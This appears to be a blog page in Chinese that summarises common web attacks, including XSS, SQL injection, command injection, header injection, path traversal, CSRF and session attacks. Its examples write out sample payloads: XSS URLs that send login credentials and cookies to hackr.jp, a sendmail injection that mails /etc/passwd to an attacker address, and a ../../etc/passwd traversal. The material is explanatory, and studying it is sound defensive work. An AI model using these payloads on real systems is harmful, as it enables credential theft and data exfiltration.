@@ -1,0 +1,950 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="http," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简单的HTTP协议本身并不存在安全性问题，因此协议本身几乎不会成为攻击的对象。应用HTTP协议的服务器和客户端，以及运行在服务器上的Web应用等资源才是攻击目标 HTTP只是一个单纯协议机制，没有提供安全性方面的功能 比较：SSH是具备协议级别的认证及会话管理等功能 解决方案：自行设计并开发认证及会话管理功能来满足web应用的安全   在客户端即可篡改请求    针对web应用的攻击模式 以服务">
+<meta name="keywords" content="http">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web攻击技术">
+<meta property="og:url" content="http://xiaoxiaojing.github.io/2017/10/24/Web攻击技术/index.html">
+<meta property="og:site_name" content="XIAOXIAOJING">
+<meta property="og:description" content="简单的HTTP协议本身并不存在安全性问题，因此协议本身几乎不会成为攻击的对象。应用HTTP协议的服务器和客户端，以及运行在服务器上的Web应用等资源才是攻击目标 HTTP只是一个单纯协议机制，没有提供安全性方面的功能 比较：SSH是具备协议级别的认证及会话管理等功能 解决方案：自行设计并开发认证及会话管理功能来满足web应用的安全   在客户端即可篡改请求    针对web应用的攻击模式 以服务">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://xiaoxiaojing.github.io/2017/10/24/Web攻击技术/attack_example.png">
+<meta property="og:image" content="http://xiaoxiaojing.github.io/2017/10/24/Web攻击技术/主动攻击.png">
+<meta property="og:image" content="http://xiaoxiaojing.github.io/2017/10/24/Web攻击技术/被动攻击.png">
+<meta property="og:image" content="http://xiaoxiaojing.github.io/2017/10/24/Web攻击技术/attack_check_area.png">
+<meta property="og:updated_time" content="2017-12-21T06:44:17.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web攻击技术">
+<meta name="twitter:description" content="简单的HTTP协议本身并不存在安全性问题，因此协议本身几乎不会成为攻击的对象。应用HTTP协议的服务器和客户端，以及运行在服务器上的Web应用等资源才是攻击目标 HTTP只是一个单纯协议机制，没有提供安全性方面的功能 比较：SSH是具备协议级别的认证及会话管理等功能 解决方案：自行设计并开发认证及会话管理功能来满足web应用的安全   在客户端即可篡改请求    针对web应用的攻击模式 以服务">
+<meta name="twitter:image" content="http://xiaoxiaojing.github.io/2017/10/24/Web攻击技术/attack_example.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":13,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://xiaoxiaojing.github.io/2017/10/24/Web攻击技术/"/>
+
+
+
+
+
+  <title>Web攻击技术 | XIAOXIAOJING</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">XIAOXIAOJING</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">JUST DO IT</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://xiaoxiaojing.github.io/2017/10/24/Web攻击技术/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="TJ">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/my.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="XIAOXIAOJING">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Web攻击技术</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-24T11:18:43+08:00">
+                2017-10-24
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2017-12-21T14:44:17+08:00">
+                2017-12-21
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HTTP/" itemprop="url" rel="index">
+                    <span itemprop="name">HTTP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <ul>
+<li>简单的HTTP协议本身并不存在安全性问题，因此协议本身几乎不会成为攻击的对象。应用HTTP协议的服务器和客户端，以及运行在服务器上的Web应用等资源才是攻击目标</li>
+<li>HTTP只是一个单纯协议机制，没有提供安全性方面的功能<ul>
+<li>比较：SSH是具备协议级别的认证及会话管理等功能</li>
+<li>解决方案：自行设计并开发认证及会话管理功能来满足web应用的安全</li>
+</ul>
+</li>
+<li>在客户端即可篡改请求<div style="max-width:600px"><br><img src="/2017/10/24/Web攻击技术/attack_example.png" alt="attack_example.png" title=""><br></div>
+
+</li>
+</ul>
+<h2 id="针对web应用的攻击模式"><a href="#针对web应用的攻击模式" class="headerlink" title="针对web应用的攻击模式"></a>针对web应用的攻击模式</h2><ol>
+<li>以服务器为目标的主动攻击：主要攻击服务器上的资源<div style="max-width:600px"><br><img src="/2017/10/24/Web攻击技术/主动攻击.png" alt="主动攻击.png" title=""><br></div></li>
+<li>以服务器为目标的被动攻击：主要攻击用户的资源和权限<div style="max-width:600px"><br><img src="/2017/10/24/Web攻击技术/被动攻击.png" alt="被动攻击.png" title=""><br></div>
+
+</li>
+</ol>
+<h3 id="一、因输出值转义不完全引发的安全漏洞"><a href="#一、因输出值转义不完全引发的安全漏洞" class="headerlink" title="一、因输出值转义不完全引发的安全漏洞"></a>一、因输出值转义不完全引发的安全漏洞</h3><ol>
+<li>客户端的验证：为了尽早地辨识输入错误，提高UI体验</li>
+<li>Web应用端（服务器端）的验证<ul>
+<li>输入值验证</li>
+<li>输出值转义<div style="max-width:500px"><br><img src="/2017/10/24/Web攻击技术/attack_check_area.png" alt="attack_check_area.png" title=""><br></div>
+
+</li>
+</ul>
+</li>
+</ol>
+<h4 id="1-跨站脚本攻击（Cross-Site-Scripting，XSS）"><a href="#1-跨站脚本攻击（Cross-Site-Scripting，XSS）" class="headerlink" title="1.跨站脚本攻击（Cross-Site Scripting，XSS）"></a>1.跨站脚本攻击（Cross-Site Scripting，XSS）</h4><ol>
+<li>概念：通过在（存在安全漏洞的Web网站的注册用户的）浏览器内运行非法的HTML标签或者JavaScript进行的一种攻击</li>
+<li>影响：<ul>
+<li>利用虚假输入表单骗取用户个人信息</li>
+<li>利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求</li>
+<li>显示伪造的文章和图片</li>
+</ul>
+</li>
+<li>案例：<ul>
+<li>使用有恶意代码的URL（如下），植入到欺诈邮件中或Web页面内，浏览器打开该URI后，设置在URL内的脚本就开始运行，用户填写ID和密码后，就直接发送到攻击者的网站（hackr.jp)，导致个人登录信息被窃取<br><code>http://example.jp/login?ID=&quot;&gt;&lt;script&gt;var+f=document.getElementById(&quot;login&quot;);+f.action=&quot;http://hackr.jp/pwget&quot;;+f.method=&quot;get&quot;;&lt;/script&gt;&lt;span+s=&quot;</code></li>
+<li>使用有恶意脚本的URL（如下），浏览器打开这个URL后，这个xss.js文件（该文件会读取用户的cookie信息）会执行，来窃取用户的Cookie信息<br><code>http://example.jp/login?ID=&quot;&gt;&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt;&quot;</code></li>
+</ul>
+</li>
+</ol>
+<h4 id="2-SQL注入攻击"><a href="#2-SQL注入攻击" class="headerlink" title="2.SQL注入攻击"></a>2.SQL注入攻击</h4><ol>
+<li>概念：SQL注入是指针对Web应用使用的数据库，通过运行非法的SQL而产生的攻击。</li>
+<li>影响：<ul>
+<li>非法查看或篡改数据库内的数据</li>
+<li>规避认证</li>
+<li>执行和数据库服务器业务关联的程序</li>
+</ul>
+</li>
+<li>案例<ul>
+<li>根据输入的字段检索内容<ul>
+<li>正常的：<code>SELECT * FROM book WHERE author=&#39;xxx&#39; and flag=1</code>,(flag=1：表示可售)</li>
+<li>攻击性的：<code>SELECT * FROM book WHERE author=&#39;xxx&#39; --&#39; and flag=1</code>(–之后的内容会被判断为注释，flag=1的条件被忽略，然后所有图书都会被查询出来)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h4 id="3-OS命令注入攻击"><a href="#3-OS命令注入攻击" class="headerlink" title="3.OS命令注入攻击"></a>3.OS命令注入攻击</h4><ol>
+<li>概念：是指通过Web应用，执行非法的操作系统命令达到攻击的目的。</li>
+<li>影响：<ul>
+<li>让Windows或Linux操作系统的命令行启动程序</li>
+</ul>
+</li>
+<li>案例：<ul>
+<li>邮件发送：分号会被解析为分隔多个执行命令的标记<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//正常调用</div><div class="line">open(MALL, &quot;| /usr/sbin/sendmail $msg&quot;)</div><div class="line">//攻击，会将/etc/passwd下的文件以邮件形式发送给hack@example.jp</div><div class="line">open(MALL, &quot;| /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp&quot;)</div></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<h4 id="4-HTTP首部注入攻击（被动攻击）"><a href="#4-HTTP首部注入攻击（被动攻击）" class="headerlink" title="4.HTTP首部注入攻击（被动攻击）"></a>4.HTTP首部注入攻击（被动攻击）</h4><ol>
+<li>概念：是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或者主体的一种攻击</li>
+<li>影响：<ul>
+<li>设置任何Cookie信息</li>
+<li>重定向到任意URL</li>
+<li>显示任意的主体【HTTP响应截断攻击（HTTP Response Splitting Attack）：向首部主体内添加内容的攻击】</li>
+</ul>
+</li>
+<li><p>案例</p>
+<ul>
+<li><p>设置任意Cookie信息</p>
+<ul>
+<li>正常：<code>Location: http://example.com/?cat=101</code>(101是外部传入的)</li>
+<li>攻击：将<code>101%0D%0ASet-Cookie:+SID=123456</code>，会解析成如下的响应<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Location: http://example.com/?cat=101 (%0D%0A:换行符)</div><div class="line">Set-Cookie: SID=123456</div></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>HTTP响应截断攻击：利用<code>%0D%0A%0D%0A</code>作出HTTP首部与主体分隔所需的空行。这样显示的主体是伪造的。</p>
+</li>
+</ul>
+</li>
+</ol>
+<h4 id="5-邮件首部注入攻击"><a href="#5-邮件首部注入攻击" class="headerlink" title="5.邮件首部注入攻击"></a>5.邮件首部注入攻击</h4><ol>
+<li>概念：是指Web应用中的邮件发送功能，攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击</li>
+<li>影响：<ul>
+<li>利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件</li>
+</ul>
+</li>
+</ol>
+<h4 id="6-目录遍历攻击（路径遍历攻击）"><a href="#6-目录遍历攻击（路径遍历攻击）" class="headerlink" title="6.目录遍历攻击（路径遍历攻击）"></a>6.目录遍历攻击（路径遍历攻击）</h4><ol>
+<li>概念：是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。</li>
+<li>案例：<ul>
+<li>文件名通过外部指定。正常: <code>http://example.com/read.php?log=0401.log</code>，不正常: <code>http://example.com/read.php?log=../../etc/passwd</code>。</li>
+</ul>
+</li>
+</ol>
+<h4 id="7-远程文件包含漏洞"><a href="#7-远程文件包含漏洞" class="headerlink" title="7.远程文件包含漏洞"></a>7.远程文件包含漏洞</h4><ol>
+<li>概念：是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取后，就可运行任意脚本的一种攻击<ul>
+<li>主要是PHP存在的安全漏洞</li>
+</ul>
+</li>
+</ol>
+<h3 id="二、因设置或设计上的缺陷引发的安全漏洞"><a href="#二、因设置或设计上的缺陷引发的安全漏洞" class="headerlink" title="二、因设置或设计上的缺陷引发的安全漏洞"></a>二、因设置或设计上的缺陷引发的安全漏洞</h3><h4 id="1-强制浏览"><a href="#1-强制浏览" class="headerlink" title="1.强制浏览"></a>1.强制浏览</h4><ol>
+<li>概念：该漏洞是指，从安置在Web服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。</li>
+<li>影响：<ul>
+<li>泄露顾客的个人信息等重要情报</li>
+<li>泄露原本需要具有访问权限的用户才可查阅的信息内容</li>
+<li>泄露未外连到外界的文件</li>
+</ul>
+</li>
+<li>案例：<ul>
+<li>直接指定文件目录或文件名称，进行访问</li>
+</ul>
+</li>
+</ol>
+<h4 id="2-不正确的错误消息处理"><a href="#2-不正确的错误消息处理" class="headerlink" title="2.不正确的错误消息处理"></a>2.不正确的错误消息处理</h4><ol>
+<li>概念：Web应用的错误消息内包含对攻击者有用的信息</li>
+</ol>
+<h4 id="3-开放重定向"><a href="#3-开放重定向" class="headerlink" title="3.开放重定向"></a>3.开放重定向</h4><ol>
+<li>概念：该漏洞是指加入指定的重定向URL到某个具有恶意的Web网站，那么用户就会被诱导至那个Web网站<ul>
+<li>开放重定向（Open Redirect）是一种对指定的任意URL作重定向跳转的功能</li>
+</ul>
+</li>
+</ol>
+<h3 id="三、因会话管理疏忽引发的安全漏洞"><a href="#三、因会话管理疏忽引发的安全漏洞" class="headerlink" title="三、因会话管理疏忽引发的安全漏洞"></a>三、因会话管理疏忽引发的安全漏洞</h3><h4 id="1-会话劫持（Session-hijack）（主动攻击）"><a href="#1-会话劫持（Session-hijack）（主动攻击）" class="headerlink" title="1.会话劫持（Session hijack）（主动攻击）"></a>1.会话劫持（Session hijack）（主动攻击）</h4><ol>
+<li>概念：攻击者通过某种手段拿到用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击的目的</li>
+</ol>
+<h4 id="2-会话固定攻击（被动攻击）"><a href="#2-会话固定攻击（被动攻击）" class="headerlink" title="2.会话固定攻击（被动攻击）"></a>2.会话固定攻击（被动攻击）</h4><ol>
+<li>概念：强制用户使用攻击者指定的会话ID</li>
+<li>案例：<ul>
+<li>攻击者先访问网站拿到会话ID</li>
+<li>攻击者设置强制用户使用该会话ID的陷阱，等待用户拿着这个ID去认证</li>
+<li>用户认证成功后，攻击者用这个会话ID访问网站</li>
+</ul>
+</li>
+</ol>
+<h4 id="3-跨站点请求伪造（Cross-Site-Request-Forgeries-CSRF-（被动攻击）"><a href="#3-跨站点请求伪造（Cross-Site-Request-Forgeries-CSRF-（被动攻击）" class="headerlink" title="3.跨站点请求伪造（Cross-Site Request Forgeries, CSRF)（被动攻击）"></a>3.跨站点请求伪造（Cross-Site Request Forgeries, CSRF)（被动攻击）</h4><ol>
+<li>概念： 攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新</li>
+<li>影响：<ul>
+<li>利用已通过认证的用户权限更新设定信息</li>
+<li>利用已通过认证的用户权限购买商品</li>
+<li>利用已通过认证的用户权限在留言板上发表言论</li>
+</ul>
+</li>
+<li><p>案例：</p>
+<ul>
+<li><p>用户A在网站W上是认证状态，浏览器中的Cookie持有已认证的会话ID</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">GET /HTTP/1.1</div><div class="line">Host:example.com</div><div class="line">Cookie: sid=123123</div></pre></td></tr></table></figure>
+</li>
+<li><p>攻击者设下陷阱（用户一旦访问就会在留言板上发言），用户触发陷阱后，就会在留言板上发言</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//陷阱</div><div class="line">&lt;img src=http://example.com/msg?q=你好&gt;</div><div class="line">//用户触发陷阱</div><div class="line">GET /msg?q=你好 HTTP/1.1</div><div class="line">Host:example.com</div><div class="line">Cookie: sid=123123</div></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="四、其他安全漏洞"><a href="#四、其他安全漏洞" class="headerlink" title="四、其他安全漏洞"></a>四、其他安全漏洞</h3><h4 id="1-密码破解"><a href="#1-密码破解" class="headerlink" title="1.密码破解"></a>1.密码破解</h4><ol>
+<li>概念：密码破解攻击即算出密码</li>
+<li>手段：<ul>
+<li>通过网络的密码试错：穷举法；字典攻击</li>
+<li>对已加密密码进行破解</li>
+</ul>
+</li>
+</ol>
+<h4 id="2-点击劫持（界面伪装）"><a href="#2-点击劫持（界面伪装）" class="headerlink" title="2.点击劫持（界面伪装）"></a>2.点击劫持（界面伪装）</h4><ol>
+<li>概念：指利用透明的按钮或链接做成陷阱，覆盖在Web页面之上，诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段</li>
+</ol>
+<h4 id="3-DoS-攻击"><a href="#3-DoS-攻击" class="headerlink" title="3.DoS 攻击"></a>3.DoS 攻击</h4><ol>
+<li>概念：让运行中的服务呈停止状态的攻击</li>
+<li>手段：<ul>
+<li>集中利用访问请求造成资源过载，资源用尽，使得服务停止</li>
+<li>通过攻击安全漏洞使服务停止</li>
+</ul>
+</li>
+<li>DDoS攻击：多台计算机发起的DoS攻击</li>
+</ol>
+<h4 id="4-后门程序"><a href="#4-后门程序" class="headerlink" title="4.后门程序"></a>4.后门程序</h4><ol>
+<li>概念：开发设置的隐藏入口，可不按正常步骤使用受限功能</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/http/" rel="tag"># http</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/24/HTTP状态码/" rel="next" title="HTTP状态码">
+                <i class="fa fa-chevron-left"></i> HTTP状态码
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/10/24/Web网络基础/" rel="prev" title="Web网络基础">
+                Web网络基础 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMjg3NC85NDM1"></div>
+    </div>
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/my.jpg"
+                alt="TJ" />
+            
+              <p class="site-author-name" itemprop="name">TJ</p>
+              <p class="site-description motion-element" itemprop="description">xiaoxiaojing's blog</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/xiaoxiaojing" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i></a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:happyxxj123@gmail.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i></a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#针对web应用的攻击模式"><span class="nav-number">1.</span> <span class="nav-text">针对web应用的攻击模式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、因输出值转义不完全引发的安全漏洞"><span class="nav-number">1.1.</span> <span class="nav-text">一、因输出值转义不完全引发的安全漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-跨站脚本攻击（Cross-Site-Scripting，XSS）"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.跨站脚本攻击（Cross-Site Scripting，XSS）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-SQL注入攻击"><span class="nav-number">1.1.2.</span> <span class="nav-text">2.SQL注入攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-OS命令注入攻击"><span class="nav-number">1.1.3.</span> <span class="nav-text">3.OS命令注入攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-HTTP首部注入攻击（被动攻击）"><span class="nav-number">1.1.4.</span> <span class="nav-text">4.HTTP首部注入攻击（被动攻击）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-邮件首部注入攻击"><span class="nav-number">1.1.5.</span> <span class="nav-text">5.邮件首部注入攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-目录遍历攻击（路径遍历攻击）"><span class="nav-number">1.1.6.</span> <span class="nav-text">6.目录遍历攻击（路径遍历攻击）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-远程文件包含漏洞"><span class="nav-number">1.1.7.</span> <span class="nav-text">7.远程文件包含漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、因设置或设计上的缺陷引发的安全漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">二、因设置或设计上的缺陷引发的安全漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-强制浏览"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.强制浏览</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-不正确的错误消息处理"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.不正确的错误消息处理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-开放重定向"><span class="nav-number">1.2.3.</span> <span class="nav-text">3.开放重定向</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、因会话管理疏忽引发的安全漏洞"><span class="nav-number">1.3.</span> <span class="nav-text">三、因会话管理疏忽引发的安全漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-会话劫持（Session-hijack）（主动攻击）"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.会话劫持（Session hijack）（主动攻击）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-会话固定攻击（被动攻击）"><span class="nav-number">1.3.2.</span> <span class="nav-text">2.会话固定攻击（被动攻击）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-跨站点请求伪造（Cross-Site-Request-Forgeries-CSRF-（被动攻击）"><span class="nav-number">1.3.3.</span> <span class="nav-text">3.跨站点请求伪造（Cross-Site Request Forgeries, CSRF)（被动攻击）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、其他安全漏洞"><span class="nav-number">1.4.</span> <span class="nav-text">四、其他安全漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-密码破解"><span class="nav-number">1.4.1.</span> <span class="nav-text">1.密码破解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-点击劫持（界面伪装）"><span class="nav-number">1.4.2.</span> <span class="nav-text">2.点击劫持（界面伪装）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-DoS-攻击"><span class="nav-number">1.4.3.</span> <span class="nav-text">3.DoS 攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-后门程序"><span class="nav-number">1.4.4.</span> <span class="nav-text">4.后门程序</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
